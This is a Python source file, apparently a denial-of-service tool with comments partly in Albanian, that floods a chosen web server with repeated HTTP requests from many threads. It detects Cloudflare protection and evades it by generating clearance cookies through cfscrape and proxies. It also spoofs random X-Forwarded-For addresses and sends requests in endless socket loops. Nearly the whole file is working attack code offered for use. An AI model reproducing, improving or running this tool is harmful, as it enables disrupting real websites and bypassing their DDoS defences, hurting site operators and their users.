import cfscrape, socket, urllib.request, ssl
import _thread, threading, random, argparse
from inspect import currentframe, getframeinfo

frameinfo = getframeinfo(currentframe())

from time import sleep


def main():
    if args.proxy_file is not None:
        proxyget()
    global go
    global x
    x = 0
    go = threading.Event()
    if cloudflare():
        print("[*] Server ", args.host, " found cloudflare to website ")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token, (i,))  # calculate CF token
        sleep(5)
        print("[*] DDOS attack has started ")
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(x + 1).start()
        go.set()
    else:
        print("[*] Server", args.host, " didn't find cloudflare to website ")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())  # Dergo kerkesen, nuk ka nevoje per kalkulime
        sleep(5)
        print("[*] DDOS attack started")
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
        go.set()


# Specified commands
def usage():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', nargs="?", help="Web serveri, p.sh: coinmarketcap.com", required=True)
    parser.add_argument('-d', '--dir', default="", help="Web path, p.sh: admin/index.php (Default: /)")
    parser.add_argument('-s', '--ssl', dest="ssl", action="store_false", help="HTTP/HTTPS")
    parser.add_argument('-p', '--port', default=80, help="Port #, 80 ose 443 (Default 80)", type=int)
    parser.add_argument('-t', '--threads', default=100, help="Numri i fijeve/threads (Default 100)", type=int)
    parser.add_argument('-x', '--proxy_file', help="Tekst fajlli per proxy (Opcionale)")
    return parser.parse_args()


# Function that tells if website is protected by cloudflare
def cloudflare():
    cf_message = False
    req = urllib.request.Request(url, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'})
    response = urllib.request.urlopen(req)
    if "CF-Cache-Status: HIT" in str(response.info()):
        cf_message = True
    return cf_message


# Creation of http request is cloudflare = False
def set_request():
    global request
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n"
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)


# Creation of http request is cloudflare = True
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"


# Gjenerimi i cookies dhe useragent per cloudflare kalkulime
def generate_cf_token(i):
    proxy = proxy_list[i].strip().split(":")  # ['91.93.42.118', '10001'] ruhen ne kete forme
    try:
        proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
        scraper = cfscrape.create_scraper()
        cookie_value, user_agent = scraper.get_cookie_string(url, proxies=proxies)
        cookie_value_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
    except:
        print("Cookies are not generated")


# Reading and writing of data from proxy file in proxy_list array
def proxyget():
    proxy_file = open(args.proxy_file, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()


# Klasa DoS ne rastin kur serveri eshte nuk eshte i pajisur me SSL/TLS certifikate
class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))
                print("Request is sent :", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    print(f"Exception in line : {frameinfo.lineno}")
                    s.close()
            except:
                print(f"Socket is not created line: {frameinfo.lineno}")



# Klasa DoS ne rastin kur serveri eshte i pajisur me SSL/TLS certifikate
class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.SSLContext.wrap_socket(s, keyfile=None, certfile=None, server_side=False,
                                               cert_reqs=ssl.CERT_NONE,
                                               ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))
                print("Request is sent :", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    print(f"Exception in line: {frameinfo.lineno}")
                    s.close()
            except:
                print(f"Socket is not created line: {frameinfo.lineno}")



# Klasa ne rastin kur perdoren serverat ndermjetesues
class RequestProxyHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                print("Request is sent: ", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(request_cf))
                except:
                    s.close()
                    print(f"Exception in line {frameinfo.lineno}")
            except:
                print(f"Socket is not created line: {frameinfo.lineno}")


if __name__ == "__main__":
    args = usage()

    request_list = []
    proxy_list = []
    cf_token = []

    if args.ssl:
        url = "http://" + args.host
    else:
        url = "https://" + args.host

    main()
